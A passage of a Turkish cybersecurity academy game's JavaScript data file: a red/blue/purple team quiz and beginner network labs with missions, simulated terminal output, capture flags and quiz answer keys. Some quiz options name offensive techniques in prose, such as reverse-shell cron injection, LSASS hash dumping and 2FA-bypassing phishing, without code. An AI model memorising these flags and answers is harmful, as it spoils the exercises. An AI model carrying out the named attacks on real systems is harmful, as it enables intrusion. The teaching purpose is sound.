

/**
 * LFL // LOST FROM LIGHT - SİBER AKADEMİ MERKEZİ VERİ VE MÜFREDAT KÜTÜPHANESİ
 * Bu dosya window nesnesine doğrudan bağlanır. fetch() veya CORS gerektirmez.
 */

// 1. ROL TESPİT TESTİ (10 KURUMSAL SENARYO SORUSU)
window.LFL_QUIZ_QUESTIONS = [
    {
        "id": 1,
        "question": "Bir web uygulamasında form alanına tek tırnak (') girdiğinizde veritabanı hata çıktısı aldınız. İlk tepkiniz ne olur?",
        "options": [
            {
                "text": "Hemen UNION tabanlı sorgularla veritabanı şemasını sızdırmaya çalışırım.",
                "team": "red"
            },
            {
                "text": "Uygulama loglarını süzüp WAF kuralı yazar ve parametrik filtrelemeyi devreye alırım.",
                "team": "blue"
            },
            {
                "text": "Bu açığın kurum için oluşturduğu etkiyi modelleyip geliştirici ekibe acil düzeltme yönergesi hazırlarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 2,
        "question": "Kurumsal ağda kaynağı bilinmeyen bir IP adresinden iç sunuculara yoğun SYN paketleri ulaşıyor. Ne yaparsınız?",
        "options": [
            {
                "text": "Paketlerin bayrak dağılımını Wireshark ile inceler, firewall üzerinden saldırgan IP bloğunu izole ederim.",
                "team": "blue"
            },
            {
                "text": "Nmap zamanlama bayraklarını (-T2) veya decoy tekniklerini kullanarak tespit edilmeyen tarama simülasyonları tasarlarım.",
                "team": "red"
            },
            {
                "text": "Mevcut IDS kuralının neden erken uyarı vermediğini analiz eder, SIEM korelasyonunu test eden Sigma kuralı yazarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 3,
        "question": "Bir Linux sunucuda cron görevlerinin yazılabilir bir bash scriptini root yetkisiyle çalıştırdığını gördünüz.",
        "options": [
            {
                "text": "Scripte reverse shell kodu enjekte ederek doğrudan root yetkilerine yükselirim (Privilege Escalation).",
                "team": "red"
            },
            {
                "text": "Dosya sahipliğini chown root:root ve izinlerini chmod 700 yapar, auditd ile script değişimlerini izlerim.",
                "team": "blue"
            },
            {
                "text": "Yetki yükseltme adımını MITRE T1053 tekniği ile eşleştirip zafiyetin kapatılmasını belgelerim.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 4,
        "question": "Windows sistemlerde bellekten kimlik bilgisi çekme (Mimikatz vb.) girişimleri hakkında odak noktanız nedir?",
        "options": [
            {
                "text": "LSASS prosesine erişip NTLM hash'lerini dökerek pass-the-hash saldırısıyla yana doğru (lateral movement) ilerlemek.",
                "team": "red"
            },
            {
                "text": "Sysmon Event ID 10 ile LSASS belleğine erişen yetkisiz prosesleri algılayıp engelleyen EDR kuralı yazmak.",
                "team": "blue"
            },
            {
                "text": "Saldırıyı izole bir laboratuvarda çalıştırıp SOC ekibinin tespit etme süresini (MTTD) kronometreyle ölçmek.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 5,
        "question": "Kurumda yeni bir mikroservis API'si yayına alınacak. Sizin yaklaşımınız hangisi olur?",
        "options": [
            {
                "text": "Yetkilendirme mekanizmalarını zorlar; IDOR, Broken Object Level Auth (BOLA) ve API anahtarı sızıntısı ararım.",
                "team": "red"
            },
            {
                "text": "API Gateway arkasında Rate Limiting, JWT imza doğrulaması ve güvenli CORS politikalarını kurgularım.",
                "team": "blue"
            },
            {
                "text": "API için STRIDE tehdit modellemesi çıkarır, test senaryolarını hücum ve savunma ekiplerine paylaştırırım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 6,
        "question": "Ağda şüpheli bir ikili dosyanın (binary) çalıştığından ve C2 bağlantısı kurduğundan şüpheleniliyor.",
        "options": [
            {
                "text": "YARA kuralları ile uç noktalarda statik imza taraması yapar, proses bellek dökümünü Volatility ile alırım.",
                "team": "blue"
            },
            {
                "text": "Dosyayı tersine mühendislikle (Ghidra/IDA) inceleyip komuta kontrol mimarisini ve iletişim protokolünü çözerim.",
                "team": "purple"
            },
            {
                "text": "Kendi yazdığım zararlının statik AV ve dinamik davranış analizlerinden (EDR) nasıl kaçacağını test ederim.",
                "team": "red"
            }
        ]
    },
    {
        "id": 7,
        "question": "Şirket personeline yönelik sosyal mühendislik ve oltalama (phishing) simülasyonu yapılacak.",
        "options": [
            {
                "text": "Gophish ile gerçekçi sahte intranet portalı klonlar, iki faktörlü kimlik doğrulamayı atlatacak reverse proxy senaryoları kurarım.",
                "team": "red"
            },
            {
                "text": "Gelen posta sunucusunda SPF, DKIM, DMARC kontrollerini sıkılaştırır ve ekli dosyaları sandbox havuzuna alırım.",
                "team": "blue"
            },
            {
                "text": "Hem çalışanların tıklama oranını hem de şüpheli maili SOC merkezine bildirme oranını ölçüp farkındalık eğitimi hazırlarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 8,
        "question": "Ağ trafiğinde uzun ve Base64 kodlanmış DNS TXT sorguları fark ettiniz. Ne düşünürsünüz?",
        "options": [
            {
                "text": "DNS Tünelleme (DNS Tunneling) ile veri sızdırma (exfiltration) tespit ettim; ilgili domaini DNS sinkhole ile izole ederim.",
                "team": "blue"
            },
            {
                "text": "Giden trafiği kısıtlı kurumsal ağlarda güvenlik duvarını aşmak için DNS ve ICMP kanallarını C2 trafiğine dönüştürürüm.",
                "team": "red"
            },
            {
                "text": "Bu tekniği MITRE ATT&CK T1071.004 tekniği ile haritalandırır, DNS sunucu loglarının SIEM korelasyonunu denetlerim.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 9,
        "question": "Active Directory ortamında Kerberoasting saldırısı gerçekleştiğini gördünüz.",
        "options": [
            {
                "text": "SPN atanmış servis hesaplarının TGS biletlerini çekip yerel makineme indirir ve hashcat ile offline kırarım.",
                "team": "red"
            },
            {
                "text": "Windows Security Loglarında Event ID 4769 (RC4 şifreleme istekleri) filtresi yazar, gMSA geçişini zorunlu kılarım.",
                "team": "blue"
            },
            {
                "text": "Active Directory üzerinde yetkili hesapların şifre karmaşıklık politikalarını ve bal küpü (honeytoken) hesaplarını doğrularım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 10,
        "question": "Kapsamlı bir tatbikat veya sızma testi bittiğinde hazırladığınız raporda en çok neye odaklanırsınız?",
        "options": [
            {
                "text": "Hedef ağda nasıl ilerlediğimi, hangi domain admin haklarını aldığımı gösteren kanıt (POC) adımlarına.",
                "team": "red"
            },
            {
                "text": "Saldırı izlerinin hangi log kaynaklarında belirdiğini ve adli bilişim (forensics) zaman çizelgesine.",
                "team": "blue"
            },
            {
                "text": "Hücum tekniklerinin mevcut savunma kurallarıyla birebir eşleşme tablosuna ve kapatılması gereken boşluklara (Gap Analysis).",
                "team": "purple"
            }
        ]
    }
];

// 2. TÜM ODALAR (RED TEAM, BLUE TEAM VE PURPLE TEAM ODALARI)
window.ACADEMY_ROOMS = [
    {
        "id": "starter-01",
        "track": "starter",
        "title": "Ağ Temelleri: IP, MAC & Paket Yolculuğu",
        "level": "0. Temel Altyapı",
        "badge": "NETWORK FOUNDATIONS & IP",
        "theory": "### Ağ Nedir ve Cihazlar Nasıl Konuşur?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kişinin birbirine mektup göndermesini düşünün. Zarfın üzerindeki açık adres (Mahalle, Sokak, Kapı No) **IP Adresidir**. O adresteki kişinin değiştirilemez T.C. Kimlik Numarası ise **MAC Adresidir**. Gönderilen uzun bir mektup tek bir zarfa sığmazsa sayfalar numaralandırılarak ayrı ayrı zarflara (**Paketlere**) konur.\n\nBilgisayar ağları (Network), iki veya daha fazla cihazın veri paylaşmak için birbirine kabloyla veya kablosuz (Wi-Fi) bağlanmasıdır.\n\n#### 1. IP Adresi (İnternet Protokolü):\nİnternetteki her cihazın benzersiz bir mantıksal adresidir (Örn: `192.168.1.45` veya `10.10.1.5`). İki çeşittir:\n* **Dinamik (Değişken) IP:** Modemi yeniden başlattığınızda değişebilir.\n* **Statik (Sabit) IP:** Sunucular için sabittir, asla değişmez.\n\n#### 2. MAC Adresi (Fiziksel Kimlik):\nCihazınızın ağ kartına (Ethernet/Wi-Fi) fabrikada kazınmış 48 bitlik benzersiz donanım kimliğidir (Örn: `00:1A:2B:3C:4D:5E`). Ağ içindeki anahtarlar (Switch), paketleri asıl sahibine ulaştırmak için MAC adreslerini kullanır.\n\n#### 3. Paket Mantığı:\nBir video izlerken veya dosya indirirken veri tek parça akmaz. 1500 baytlık küçük paketlere bölünür. Her paketin başında 'Kimden geldi' ve 'Kime gidiyor' etiketleri (Header) bulunur.",
        "mission": "Kendi ağ kartınızın atanmış IP adresini ve MAC kimliğini terminalde ip a (veya ifconfig) komutuyla listeleyin.",
        "expectedCommand": "ip a",
        "acceptedCommands": [
            "ip a",
            "ip addr",
            "ip address",
            "ifconfig"
        ],
        "hintExplanation": "<p><strong>ip a:</strong> 'ip address' komutunun kısaltmasıdır. Linux sistemlerde bilgisayara bağlı tüm ağ kartlarını, aldıkları yerel IP adreslerini ve donanım MAC adreslerini ekrana döker.</p>",
        "terminalSuccessOutput": "[+] AĞ KARTLARI LİSTELENİYOR:\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo (Yerel Geri-Dönüş / Localhost)\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 08:00:27:fa:41:99 (MAC Donanım Kimliği)\n    inet 192.168.1.105/24 brd 192.168.1.255 scope global dynamic eth0\n[TEBRİKLER] Ağ kartınız ve yerel IP adresiniz başarıyla doğrulandı!\n[FLAG] LFL{starter_ip_mac_packet_journey_discovered}",
        "flag": "LFL{starter_ip_mac_packet_journey_discovered}",
        "nextId": "starter-02",
        "whyWeUse": "Bir siber güvenlik uzmanı bir bilgisayara oturduğunda ilk soracağı soru **'Benim bu ağdaki kimliğim ve IP adresim ne?'** sorusudur. Kendi IP adresini bilmeden ne ağdaki diğer cihazları tarayabilirsin ne de başka bir bilgisayardan kendine bağlantı alabilirsin. Mouse ile ayarlar menüsünde gezinmek yerine `ip a` komutuyla 1 saniyede tüm ağ kartlarını, IP adresini ve fiziksel MAC adresini tek ekranda görürüz.",
        "cmdAnatomy": [
            {
                "token": "ip",
                "role": "Ana Komut (Ağ Aracı)",
                "desc": "Linux'ta ağ kartlarını, IP adreslerini ve internet bağlantılarını yöneten ana programdır."
            },
            {
                "token": "a",
                "role": "Parametre (address)",
                "desc": "'address' kelimesinin kısaltmasıdır (`ip address` ile aynıdır). Bilgisayara takılı tüm ağ kartlarının adres bilgilerini ekrana döker."
            }
        ],
        "outputGuide": [
            {
                "snippet": "1: lo: <LOOPBACK,UP> ... inet 127.0.0.1/8",
                "meaning": "**lo (Loopback):** Bilgisayarın kendi kendisiyle konuşmak için kullandığı iç hattır. `127.0.0.1` her zaman 'benim kendi bilgisayarım (localhost)' demektir."
            },
            {
                "snippet": "2: eth0: <BROADCAST,MULTICAST,UP>",
                "meaning": "**eth0:** Bilgisayarın dış dünyaya ve modeme bağlanan gerçek Ethernet (ağ) kartıdır. `state UP` yazması kartın aktif ve çalışır olduğunu gösterir."
            },
            {
                "snippet": "link/ether 08:00:27:fa:41:99",
                "meaning": "**MAC Adresi:** Ağ kartının fabrikada basılmış, değişmeyen fiziksel donanım kimliğidir."
            },
            {
                "snippet": "inet 192.168.1.105/24",
                "meaning": "**IPv4 Adresi (`inet`):** İşte aradığımız adres! Bu bilgisayarın yerel ağdaki IP adresi `192.168.1.105`'tir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "IP Adresi (inet)",
                "desc": "Cihazların ağ üzerinde birbirini bulmasını sağlayan ev/telefon numarası gibi sayısal adrestir (Örn: 192.168.1.105)."
            },
            {
                "term": "MAC Adresi (link/ether)",
                "desc": "Her ağ kartına üretimde verilen benzersiz donanım kimliğidir (T.C. Kimlik No gibi düşünülebilir)."
            },
            {
                "term": "Loopback (127.0.0.1)",
                "desc": "Cihazın dış ağa çıkmadan kendi içindeki servisleri test etmesini sağlayan sanal iç adrestir (Localhost)."
            },
            {
                "term": "eth0",
                "desc": "Linux'ta birinci kablolu ağ kartına verilen standart isimdir (Ethernet 0)."
            }
        ],
        "quickCheck": {
            "question": "Terminalde `ip a` yazdığında `eth0` başlığının altındaki hangi satır senin yerel ağdaki IPv4 adresini gösterir?",
            "options": [
                "inet 192.168.1.105/24 satırı",
                "link/ether 08:00:27:fa:41:99 satırı",
                "1: lo: 127.0.0.1 satırı"
            ],
            "answer": 0,
            "explanation": "Doğru! `inet` satırı IPv4 adresini (`192.168.1.105`), `link/ether` fiziksel MAC adresini, `lo (127.0.0.1)` ise cihazın kendi iç adresini gösterir."
        }
    },
    {
        "id": "starter-02",
        "track": "starter",
        "title": "Portlar & Servisler: Bilgisayarın 65.535 Kapısı",
        "level": "0. Temel Altyapı",
        "badge": "PORTS & SERVICES ARCHITECTURE",
        "theory": "### Port Nedir ve Neden Vardır?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir iş merkezine (Plaza) gittiniz. Plazanın cadde adresi binanın **IP Adresidir**. Ancak binanın içinde 65.535 farklı ofis odası (**Port**) vardır. 80 numaralı oda Web Restoranı, 22 numaralı oda Yönetici Kasası, 53 numaralı oda ise Danışma/Rehberdir. Hangi kapıyı çalarsanız o servisle muhatap olursunuz.\n\nBir bilgisayarda aynı anda hem web sitesi çalışabilir, hem oyun oynanabilir, hem de Spotify müzik çalabilir. Bu servislerin verilerinin birbirine karışmaması için işletim sistemi her servise bir **Port Numarası** atar (Toplam 1 ile 65.535 arası).\n\n#### En Meşhur Siber Güvenlik Portları:\n* **Port 80 (HTTP):** Standart şifresiz web siteleri.\n* **Port 443 (HTTPS):** Şifreli güvenli web siteleri (SSL/TLS).\n* **Port 22 (SSH):** Güvenli uzaktan komut çalıştırma.\n* **Port 53 (DNS):** İsim sorgulama rehberi.\n* **Port 21 (FTP):** Dosya gönderme ve alma.\n* **Port 445 (SMB):** Windows dosya ve yazıcı paylaşımı.\n* **Port 3389 (RDP):** Windows Uzak Masaüstü ekranı.",
        "mission": "Sisteminizde hangi portların şu an dışarıdan bağlantı beklediğini (LISTEN) ss -tuln komutuyla listeleyin.",
        "expectedCommand": "ss -tuln",
        "acceptedCommands": [
            "ss -tuln",
            "ss -tulpn",
            "netstat -tuln",
            "netstat -an"
        ],
        "hintExplanation": "<p><strong>ss:</strong> 'Socket Statistics' aracıdır, ağ bağlantılarını denetler.</p><p><strong>-t:</strong> TCP portlarını listele.</p><p><strong>-u:</strong> UDP portlarını listele.</p><p><strong>-l:</strong> Yalnızca dinlemede (Listening) olan açık kapıları göster.</p><p><strong>-n:</strong> İsimler yerine doğrudan sayısal port numaralarını yaz (Örn: http yerine 80).</p>",
        "terminalSuccessOutput": "[+] AÇIK DİNLENEN PORTLAR:\nNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:* (SSH Yönetim)\ntcp    LISTEN  0       511            0.0.0.0:80            0.0.0.0:* (Web Servisi)\ntcp    LISTEN  0       511            0.0.0.0:443           0.0.0.0:* (Güvenli HTTPS)\nudp    UNCONN  0       0              0.0.0.0:53            0.0.0.0:* (DNS Çözümleyici)\n[BAŞARILI] Sistemdeki açık kapılar haritalandı!\n[FLAG] LFL{starter_ports_and_services_mapped_ok}",
        "flag": "LFL{starter_ports_and_services_mapped_ok}",
        "nextId": "starter-03",
        "whyWeUse": "Bir binanın IP adresi o binanın sokak adresiyse, **Port numaraları** da o binadaki daire kapılarıdır (Web kapısı: 80, SSH kapısı: 22 gibi). Kendi bilgisayarımızda veya incelediğimiz bir sunucuda **'Şu an dışarıya hangi kapılar açık? Arka planda dışarıdan bağlantı bekleyen hangi servisler var?'** sorusunun cevabını `ss -tuln` komutuyla saniyeler içinde görürüz.",
        "cmdAnatomy": [
            {
                "token": "ss",
                "role": "Ana Komut",
                "desc": "'Socket Statistics' kısaltmasıdır. Ağ bağlantılarını ve açık kapıları (portları) listeler."
            },
            {
                "token": "-tuln",
                "role": "4'lü Birleşik Parametre",
                "desc": "4 harfin birleşimidir:\n• `-t`: TCP portlarını göster\n• `-u`: UDP portlarını göster\n• `-l`: Sadece dinlemede (LISTEN / Açık) olan kapıları göster\n• `-n`: İsim yerine doğrudan port numarasını (22, 80, 443) yaz."
            }
        ],
        "outputGuide": [
            {
                "snippet": "tcp LISTEN ... 0.0.0.0:22",
                "meaning": "**Port 22 (SSH):** Uzaktan yönetim kapısının AÇIK (`LISTEN`) olduğunu ve dış dünyadaki herkesten (`0.0.0.0`) bağlantı kabul ettiğini gösterir."
            },
            {
                "snippet": "tcp LISTEN ... 0.0.0.0:80 ve 443",
                "meaning": "**Port 80 (HTTP) & 443 (HTTPS):** Bu makinede bir web sitesi çalıştığını ve dışarıdan gelen ziyaretçilere açık olduğunu gösterir."
            },
            {
                "snippet": "udp UNCONN ... 0.0.0.0:53",
                "meaning": "**Port 53 (DNS):** UDP protokolü üzerinden çalışan isim çözümleme (DNS) servisinin aktif olduğunu gösterir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Port (Kapı)",
                "desc": "Tek bir IP adresinde aynı anda hem web sitesi (80), hem SSH (22), hem DNS (53) çalışabilmesini sağlayan 1-65535 arası kapı numaralarıdır."
            },
            {
                "term": "LISTEN (Dinlemede)",
                "desc": "Bir portun arkasında bir programın çalıştığını ve dışarıdan gelecek bağlantıları beklediğini belirtir."
            },
            {
                "term": "0.0.0.0",
                "desc": "Kapının tüm ağ kartlarından ve dış dünyadan gelecek bağlantılara açık olduğunu ifade eder."
            }
        ],
        "quickCheck": {
            "question": "`ss -tuln` komutundaki `-l` ve `-n` harfleri ne işe yarar?",
            "options": [
                "-l sadece açık/dinleyen (LISTEN) kapıları gösterir, -n ise port numaralarını sayı olarak (80, 22 gibi) yazar",
                "-l bilgisayarı kapatır, -n interneti keser",
                "-l şifreleri kırar, -n virüsleri siler"
            ],
            "answer": 0,
            "explanation": "Harika! `-l` (Listening) sadece açık kapıları süzer, `-n` (Numeric) ise `http` yazmak yerine doğrudan `80` yazarak çıktıyı hızlandırır ve netleştirir."
        }
    },
    {
        "id": "starter-03",
        "track": "starter",
        "title": "DNS Rehberi: Alan Adından IP Adresine Çözümleme",
        "level": "0. Temel Altyapı",
        "badge": "DNS PROTOCOL & RESOLUTION",
        "theory": "### DNS (Domain Name System) Nedir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nAkıllı telefonunuzun rehberinde arkadaşınız 'Ali'nin ismine tıklarsınız; telefon ise arka planda Ali'nin 10 haneli numarasını arar. Kimse arkadaşlarının 10 haneli telefon numaralarını ezberlemez. DNS, internetin küresel telefon rehberidir. Tarayıcıya `google.com` yazdığınızda DNS bu ismi `142.250.185.206` gibi sunucu numarasına çevirir.\n\n#### DNS Kayıt Türleri:\n* **A Kaydı (IPv4):** Bir alan adını 32-bit IPv4 adresine bağlar (Örn: `lfl.corp -> 10.10.1.5`).\n* **AAAA Kaydı (IPv6):** 128-bit yeni nesil IPv6 adresine bağlar.\n* **CNAME (Takma Ad):** Bir ismi başka bir isme yönlendirir (`www.lfl.corp -> lfl.corp`).\n* **MX (Mail Exchange):** Şirketin e-posta sunucusunun yerini gösterir.\n* **TXT Kaydı:** Metin notları (SPF, DKIM gibi e-posta güvenlik sertifikaları).",
        "mission": "nslookup google.com komutunu kullanarak alan adının hangi gerçek sunucu IP'sine çözümlendiğini sorgulayın.",
        "expectedCommand": "nslookup google.com",
        "acceptedCommands": [
            "nslookup google.com",
            "dig google.com",
            "host google.com"
        ],
        "hintExplanation": "<p><strong>nslookup:</strong> 'Name Server Lookup' aracıdır. Alan adını DNS sunucusuna sorar ve karşılığındaki gerçek IP adresini getirir.</p>",
        "terminalSuccessOutput": "[+] DNS SORGUSU ÇALIŞTIRILIYOR (nslookup google.com)...\nServer:         1.1.1.1 (Cloudflare DNS)\nAddress:        1.1.1.1#53\n\nNon-authoritative answer:\nName:   google.com\nAddress: 142.250.185.206\nAddress: 2a00:1450:4001:828::200e\n[BAŞARILI] Alan adı IP adresine dönüştürüldü!\n[FLAG] LFL{starter_dns_resolution_phonebook_master}",
        "flag": "LFL{starter_dns_resolution_phonebook_master}",
        "nextId": "starter-04",
        "whyWeUse": "İnsanlar `google.com` gibi isimleri hatırlar ama bilgisayarlar sadece sayısal IP adresleriyle (`142.250.185.206` gibi) haberleşir. Bir siber güvenlik testinde hedef web sitesinin gerçekte hangi IP adresindeki sunucuda çalıştığını bulmak için internetin telefon rehberi olan **DNS sunucusuna** `nslookup` komutuyla sorarız.",
        "cmdAnatomy": [
            {
                "token": "nslookup",
                "role": "Ana Komut",
                "desc": "'Name Server Lookup' (İsim Sunucusu Sorgulama) aracıdır. Alan adını verip IP adresini öğrenmemizi sağlar."
            },
            {
                "token": "google.com",
                "role": "Hedef Alan Adı (Domain)",
                "desc": "Gerçek IP adresini öğrenmek istediğimiz hedef web sitesinin adıdır."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Server: 1.1.1.1 (Cloudflare DNS)",
                "meaning": "Sorumuzu yanıtlayan DNS Rehber Sunucusunun (Cloudflare) IP adresidir."
            },
            {
                "snippet": "Address: 142.250.185.206",
                "meaning": "**Aradığımız Cevap (IPv4):** `google.com` adresinin arkasındaki gerçek sunucu IPv4 numarasıdır."
            },
            {
                "snippet": "Address: 2a00:1450:4001:828::200e",
                "meaning": "**IPv6 Adresi:** Aynı sunucunun yeni nesil 128-bitlik uzun IPv6 adresidir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "DNS (Domain Name System)",
                "desc": "İnternetin telefon rehberidir; site isimlerini (google.com) bilgisayarların anlayacağı IP adreslerine çevirir."
            },
            {
                "term": "A Kaydı vs AAAA Kaydı",
                "desc": "DNS rehberinde A kaydı normal IPv4 adresini, AAAA kaydı ise uzun IPv6 adresini tutar."
            }
        ],
        "quickCheck": {
            "question": "Bir hedefi taramadan önce neden `nslookup` komutunu kullanırız?",
            "options": [
                "Hedefin alan adından (domain) gerçek sunucu IP adresini öğrenmek için",
                "Kendi bilgisayarımızın sesini açmak için",
                "Hedefin klavyesini kilitlemek için"
            ],
            "answer": 0,
            "explanation": "Kesinlikle! Ağ tarama araçları ve güvenlik duvarları IP adresleriyle çalışır; `nslookup` bize alan adının arkasındaki gerçek IP'yi verir."
        }
    },
    {
        "id": "starter-04",
        "track": "starter",
        "title": "Bağlantı Protokolleri: TCP vs UDP & El Sıkışma",
        "level": "0. Temel Altyapı",
        "badge": "TCP 3-WAY HANDSHAKE & ICMP",
        "theory": "### TCP ile UDP Arasındaki Hayati Fark\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\n* **TCP (Garantili Kargo):** İadeli taahhütlü mektuptur. Mektup teslim edilirken alıcı imza atar. Mektup yolda kaybolursa postane hemen yenisini gönderir. (Web siteleri, dosya indirme, e-posta).\n* **UDP (Telsiz Anonsu):** Polis telsizidir. Polis anonsu yapar, karşı taraf o an duydu mu duyulmadı mı beklemez, konuşmaya devam eder. Kaybolan paket tekrar gönderilmez çünkü hız kritiktir. (Canlı yayın, Discord sesli sohbet, online oyunlar).\n\n#### TCP 3-Yollu El Sıkışma (3-Way Handshake):\nİki bilgisayar TCP üzerinden konuşmadan önce 3 aşamalı bir selamlaşma yapar:\n1. **SYN (Synchronize):** İstemci sunucuya 'Seninle bağlantı kurmak istiyorum' der.\n2. **SYN-ACK:** Sunucu 'İsteğini aldım, ben de hazırım' cevabını verir.\n3. **ACK (Acknowledge):** İstemci 'Tamam, anlaştık, veri gönderimine başlıyorum' der ve oturum kurulur.",
        "mission": "ping -c 4 10.10.1.5 komutu ile hedef sunucuya ICMP eko paketleri yollayarak yanıt verip vermediğini test edin.",
        "expectedCommand": "ping -c 4 10.10.1.5",
        "acceptedCommands": [
            "ping -c 4 10.10.1.5",
            "ping -c 3 10.10.1.5",
            "ping 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>ping:</strong> Ağdaki bir cihazın açık ve erişilebilir olup olmadığını test eden en temel araçtır.</p><p><strong>-c 4:</strong> Sürekli sonsuza kadar ping atmak yerine 4 paket gönderip dur demektir.</p>",
        "terminalSuccessOutput": "PING 10.10.1.5 (10.10.1.5) 56(84) bytes of data.\n64 bytes from 10.10.1.5: icmp_seq=1 ttl=64 time=0.452 ms\n64 bytes from 10.10.1.5: icmp_seq=2 ttl=64 time=0.418 ms\n64 bytes from 10.10.1.5: icmp_seq=3 ttl=64 time=0.435 ms\n64 bytes from 10.10.1.5: icmp_seq=4 ttl=64 time=0.399 ms\n\n--- 10.10.1.5 ping istatistikleri ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms\n[HEDEF CANLI] 0 paket kaybı ile sunucu yanıt verdi!\n[FLAG] LFL{starter_ping_icmp_handshake_alive}",
        "flag": "LFL{starter_ping_icmp_handshake_alive}",
        "nextId": "starter-05",
        "whyWeUse": "Bir hedef sunucuya tarama veya bağlantı yapmadan önce **'Bu makine şu an açık mı ve aramızda ağ bağlantısı var mı?'** diye kontrol etmemiz gerekir. `ping` komutu hedefe küçük bir dijital ses sinyali (ICMP paketi) gönderir; hedef makine açıksa sinyal geri döner. Böylece hedefin hayatta (canlı) olup olmadığını ve yanıt hızını anında öğreniriz.",
        "cmdAnatomy": [
            {
                "token": "ping",
                "role": "Ana Komut",
                "desc": "Hedef adrese ICMP 'Echo Request' (Orada mısın?) sinyali gönderen ağ test aracıdır."
            },
            {
                "token": "-c",
                "role": "Parametre (Count / Adet)",
                "desc": "Kaç adet sinyal gönderileceğini belirler. Linux'ta `-c` yazmazsan ping sen durdurana kadar sonsuza dek çalışır!"
            },
            {
                "token": "4",
                "role": "Değer (Adet)",
                "desc": "Tam olarak 4 adet test paketi gönderip otomatik durmasını söyler."
            },
            {
                "token": "10.10.1.5",
                "role": "Hedef IP",
                "desc": "Ayakta olup olmadığını kontrol etmek istediğimiz hedef sunucunun IP adresidir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "64 bytes from 10.10.1.5: icmp_seq=1",
                "meaning": "Hedeften (`10.10.1.5`) 64 baytlık ilk (`icmp_seq=1`) yanıt paketi başarıyla geri geldi! Yani hedef makine AÇIK."
            },
            {
                "snippet": "ttl=64",
                "meaning": "**TTL (Time To Live):** Paketin yaşam süresidir. Linux makineler genellikle `ttl=64`, Windows makineler ise `ttl=128` ile yanıt verir. Buradan hedefin Linux olduğunu bile anlayabiliriz!"
            },
            {
                "snippet": "time=0.452 ms",
                "meaning": "Sinyalin hedefe gidip gelme süresidir (milisaniye). 1 ms altı çok hızlı yerel ağ bağlantısı demektir."
            },
            {
                "snippet": "4 packets transmitted, 4 received, 0% packet loss",
                "meaning": "4 paket gönderildi, 4'ü de geri alındı, kayıp `%0`. Bağlantı kusursuz!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "ICMP",
                "desc": "Ping komutunun kullandığı, cihazların birbirine 'Orada mısın?' ve 'Evet buradayım' mesajı göndermesini sağlayan protokoldür."
            },
            {
                "term": "TTL (Time To Live)",
                "desc": "Paketin ağda sonsuza kadar dolaşmasını önleyen sayaçtır (64 civarıysa Linux, 128 civarıysa Windows işletim sistemine işaret eder)."
            },
            {
                "term": "TCP 3-Way Handshake",
                "desc": "TCP bağlantısı kurulurken yapılan 3 adımlı selamlaşmadır: SYN -> SYN/ACK -> ACK."
            }
        ],
        "quickCheck": {
            "question": "Linux'ta `ping 10.10.1.5` komutuna neden `-c 4` parametresini ekliyoruz?",
            "options": [
                "Sadece 4 test paketi gönderip otomatik durması için (yoksa sonsuza kadar devam eder)",
                "Hedefin 4 numaralı portunu kırmak için",
                "Aynı anda 4 farklı bilgisayara saldırmak için"
            ],
            "answer": 0,
            "explanation": "Doğru! Linux'ta `ping` komutu varsayılan olarak sonsuza kadar çalışır. `-c 4` (count 4) parametresi 4 sinyalden sonra işlemin temizce tamamlanmasını sağlar."
        }
    },
    {
        "id": "starter-05",
        "track": "starter",
        "title": "Web Protokolü: HTTP İstekleri, Başlıklar & Durum Kodları",
        "level": "0. Temel Altyapı",
        "badge": "HTTP REQUEST & RESPONSE CODES",
        "theory": "### Web Siteleri Arka Planda Nasıl Haberleşir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir restorana oturdunuz:\n* Garsona 'Bana tatlı menüsünü getir' demeniz bir **HTTP GET** isteğidir.\n* Garsonun menüyü önünüze koyması **200 OK (Başarılı)** yanıtıdır.\n* 'Bu restoranda sushi var mı?' dediğinizde garsonun 'Bizde öyle bir yemek yok' demesi **404 Not Found (Bulunamadı)** yanıtıdır.\n* Sipariş fişine adınızı ve kredi kartınızı yazıp garsona uzatmanız ise **HTTP POST** isteğidir.\n\n#### En Temel HTTP Durum Kodları:\n* **200 OK:** İstek başarıyla işlendi ve içerik teslim edildi.\n* **301/302 Redirect:** Sayfa başka bir adrese taşındı.\n* **401 Unauthorized:** Giriş yapmadınız, kullanıcı adı/şifre gerekli.\n* **403 Forbidden:** Giriş yaptınız ama bu dosyayı görmeye yetkiniz yok.\n* **404 Not Found:** Böyle bir sayfa ya da dosya sunucuda mevcut değil.\n* **500 Internal Server Error:** Sunucu kodu patladı, arka planda hata oluştu.",
        "mission": "curl -I https://api.lfl.corp/health komutuyla hedef web sunucusunun HTTP başlıklarını (Header) ve durum kodunu çekin.",
        "expectedCommand": "curl -I https://api.lfl.corp/health",
        "acceptedCommands": [
            "curl -I https://api.lfl.corp/health",
            "curl -i https://api.lfl.corp/health",
            "curl --head https://api.lfl.corp/health"
        ],
